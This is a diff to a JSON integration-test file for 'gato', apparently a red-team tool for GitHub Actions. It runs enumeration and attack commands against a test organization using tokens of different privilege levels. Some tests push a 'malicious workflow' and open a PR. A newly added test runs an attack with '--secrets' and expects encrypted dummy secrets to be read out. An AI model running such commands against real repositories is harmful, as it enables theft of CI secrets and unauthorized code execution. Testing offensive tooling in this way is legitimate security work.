@@ -1,7 +1,7 @@
 [
     {
         "PAT": "LOW_PRIV_PAT",
-        "invocation": "gato enum --self-enumeration",
+        "invocation": "gato -s enum --self-enumeration",
         "assertions": [
             {
                 "expect": "[+] The user reallybadcicd belongs to 0 organizations!",
@@ -12,11 +12,11 @@
                 "type": "stdout"
             }
         ],
-        "extra_validation": "function_name"
+        "extra_validation": {"type":"none"}
     },
     {
         "PAT": "ORG_MEMBER_REPO_TOKEN",
-        "invocation": "gato enum --self-enumeration",
+        "invocation": "gato -s enum --self-enumeration",
         "assertions": [
             {
                 "expect": "[+] The user main-feature-LINT-DocumentationUpdate belongs to 1 organizations!",
@@ -31,11 +31,11 @@
                 "type": "stdout"
             }
         ],
-        "extra_validation": "function_name"
+        "extra_validation": {"type":"none"}
     },
     {
         "PAT": "ORG_ADMIN_REPO_WORKFLOW_ADMIN_TOKEN",
-        "invocation": "gato enum --self-enumeration",
+        "invocation": "gato -s enum --self-enumeration",
         "assertions": [
             {
                 "expect": "The user GHRunner-ad belongs to 1 organizations!",
@@ -58,11 +58,11 @@
                 "type": "stdout"
             }
         ],
-        "extra_validation": "function_name"
+        "extra_validation": {"type":"none"}
     },
     {
         "PAT": "LOW_PRIV_PAT",
-        "invocation": "gato enum --target GHRunnerPlayground",
+        "invocation": "gato -s enum --target GHRunnerPlayground",
         "assertions": [
             {
                 "expect": "Enumerating the GHRunnerPlayground organization!",
@@ -77,11 +77,11 @@
                 "type": "stdout"
             }
         ],
-        "extra_validation": "function_name"
+        "extra_validation": {"type":"none"}
     },
     {
         "PAT": "ORG_MEMBER_REPO_TOKEN",
-        "invocation": "gato enum --target GHRunnerPlayground",
+        "invocation": "gato -s enum --target GHRunnerPlayground",
         "assertions": [
             {
                 "expect": "Enumerating the GHRunnerPlayground organization!",
@@ -96,11 +96,11 @@
                 "type": "stdout"
             }
         ],
-        "extra_validation": "function_name"
+        "extra_validation": {"type":"none"}
     },
     {
         "PAT": "ORG_ADMIN_REPO_WORKFLOW_TOKEN",
-        "invocation": "gato enum --target GHRunnerPlayground",
+        "invocation": "gato -s enum --target GHRunnerPlayground",
         "assertions": [
             {
                 "expect": "Enumerating the GHRunnerPlayground organization!",
@@ -123,11 +123,11 @@
                 "type": "stdout"
             }
         ],
-        "extra_validation": "function_name"
+        "extra_validation": {"type":"none"}
     },
     {
         "PAT": "ORG_MEMBER_REPO_TOKEN",
-        "invocation": "gato enum --repository GHRunnerPlayground/TestWF2",
+        "invocation": "gato -s enum --repository GHRunnerPlayground/TestWF2",
         "assertions": [
             {
                 "expect": "Enumerating: GHRunnerPlayground/TestWF2!",
@@ -142,12 +142,12 @@
                 "type": "stdout"
             }
         ],
-        "extra_validation": "function_name"
+        "extra_validation": {"type":"none"}
     },
 
     {
         "PAT": "ORG_ADMIN_REPO_TOKEN",
-        "invocation": "gato enum --repository GHRunnerPlayground/TestWF",
+        "invocation": "gato -s enum --repository GHRunnerPlayground/TestWF",
         "assertions": [
             {
                 "expect": "Enumerating: GHRunnerPlayground/TestWF!",
@@ -166,11 +166,11 @@
                 "type": "stdout"
             }
         ],
-        "extra_validation": "function_name"
+        "extra_validation": {"type":"none"}
     },
     {
         "PAT": "ORG_ADMIN_REPO_WORKFLOW_TOKEN",
-        "invocation": "gato enum --repository GHRunnerPlayground/TestWF",
+        "invocation": "gato -s enum --repository GHRunnerPlayground/TestWF",
         "assertions": [
             {
                 "expect": "Enumerating: GHRunnerPlayground/TestWF!",
@@ -189,11 +189,11 @@
                 "type": "stdout"
             }
         ],
-        "extra_validation": "function_name"
+        "extra_validation": {"type":"none"}
     },
     {
         "PAT": "ORG_ADMIN_REPO_WORKFLOW_TOKEN",
-        "invocation": "gato a -t GHRunnerPlayground/TestWF -w",
+        "invocation": "gato -s a -t GHRunnerPlayground/TestWF -w",
         "assertions": [
             {
                 "expect": "Succesfully pushed the malicious workflow!",
@@ -208,11 +208,11 @@
                 "type": "stdout"
             }
         ],
-        "extra_validation": "function_name"
+        "extra_validation": {"type":"none"}
     },
     {
         "PAT": "ORG_ADMIN_REPO_WORKFLOW_ADMIN_DELETE_TOKEN",
-        "invocation": "gato a -t GHRunnerPlayground/TestWF2 -pr",
+        "invocation": "gato -s a -t GHRunnerPlayground/TestWF2 -pr",
         "assertions": [
             {
                 "expect": "Successfully created a PR! It can be viewed at",
@@ -231,6 +231,136 @@
                 "type": "stdout"
             }
         ],
-        "extra_validation": "function_name"
+        "extra_validation": {"type":"none"}
+    },
+    {
+        "PAT": "ORG_ADMIN_REPO_WORKFLOW_ADMIN_TOKEN",
+        "invocation": "gato -s e -t GHRunnerPlayground -sr",
+        "assertions": [
+            {
+                "expect": "The organization has 1 secret(s)",
+                "type": "stdout"
+            },
+            {
+                "expect": "INTEGRATION_SECRET, last updated 2023-06-22T01:47:43Z",
+                "type": "stdout"
+            }
+        ],
+        "extra_validation": {"type":"none"}
+    },
+    {
+        "PAT": "ORG_ADMIN_REPO_WORKFLOW_TOKEN",
+        "invocation": "gato -s e -r GHRunnerPlayground/md-test -sr",
+        "assertions": [
+            {
+                "expect": "The repository can access 2 secrets and the token can use a workflow to read",
+                "type": "stdout"
+            },
+            {
+                "expect": "REPO_SECRET, last updated 2023-04-20T18:01:37Z",
+                "type": "stdout"
+            },
+            {
+                "expect": "INTEGRATION_SECRET, last updated 2023-06-22T01:47:43Z",
+                "type": "stdout"
+            }
+        ],
+        "extra_validation": {"type":"none"}
+    },
+    {
+        "PAT": "ORG_MEMBER_REPO_TOKEN",
+        "invocation": "gato -s enum --self-enumeration -oJ integration_test.json",
+        "assertions": [
+            {
+                "expect": "[+] The user main-feature-LINT-DocumentationUpdate belongs to 1 organizations!",
+                "type": "stdout"
+            },
+            {
+                "expect": "About to enumerate 4 repos within the GHRunnerPlayground organization!",
+                "type": "stdout"
+            },
+            {
+                "expect": "The GitHub Classic PAT has the following scopes: repo",
+                "type": "stdout"
+            }
+        ],
+        "extra_validation": {
+            "type": "file",
+            "filename": "integration_test.json",
+            "assertions": [
+                "\"username\": \"main-feature-LINT-DocumentationUpdate\"",
+                "\"accessible_runners\": [",
+                "\"name\": \"ghrunner-test\","
+            ]
+        }
+    },
+    {
+        "PAT": "ORG_MEMBER_REPO_TOKEN",
+        "invocation": "gato -s enum --target GHRunnerPlayground -oJ integration_test.json",
+        "assertions": [
+            {
+                "expect": "About to enumerate 4 repos within the GHRunnerPlayground organization!",
+                "type": "stdout"
+            },
+            {
+                "expect": "The GitHub Classic PAT has the following scopes: repo",
+                "type": "stdout"
+            }
+        ],
+        "extra_validation": {
+            "type": "file",
+            "filename": "integration_test.json",
+            "assertions": [
+                "\"username\": \"main-feature-LINT-DocumentationUpdate\"",
+                "\"accessible_runners\": [",
+                "\"name\": \"ghrunner-test\",",
+                "\"org_member\": true,",
+                "\"org_admin_user\": false,"
+            ]
+        }
+    },
+    {
+        "PAT": "ORG_MEMBER_REPO_TOKEN",
+        "invocation": "gato -s enum --repository GHRunnerPlayground/TestWF2 -oJ integration_test.json",
+        "assertions": [
+            {
+                "expect": "The GitHub Classic PAT has the following scopes: repo",
+                "type": "stdout"
+            }
+        ],
+        "extra_validation": {
+            "type": "file",
+            "filename": "integration_test.json",
+            "assertions": [
+                "\"username\": \"main-feature-LINT-DocumentationUpdate\"",
+                "\"accessible_runners\": [",
+                "\"name\": \"ghrunner-test\",",
+                "\"repositories\": [",
+                "\"name\": \"GHRunnerPlayground/TestWF2\","
+            ]
+        }
+    },
+    {
+        "PAT": "ORG_ADMIN_REPO_WORKFLOW_TOKEN",
+        "invocation": "gato -s attack -t GHRunnerPlayground/TestWF --secrets --author-name Hackerman --author-email hacker@evilcorp.com --message AllYourSecretBelongToUs --delete --timeout 60",
+        "assertions": [
+            {
+                "expect": "The malicious workflow executed succesfully!",
+                "type": "stdout"
+            },
+            {
+                "expect": "Run echo -e \"DUMMY_TEST_SECRET=$DUMMY_TEST_SECRET \\n\" | openssl rsautl -encrypt -inkey <(echo",
+                "type": "stdout"
+            },
+            {
+                "expect": "The repository has 1 accessible secret(s)!",
+                "type": "stdout"
+            },
+            {
+                "expect": "DUMMY_TEST_SECRET=SUPER SECRET DUMMY VALUE",
+                "type": "stdout"
+            }
+        ],
+        "extra_validation": {"type":"none"}
     }
 ]
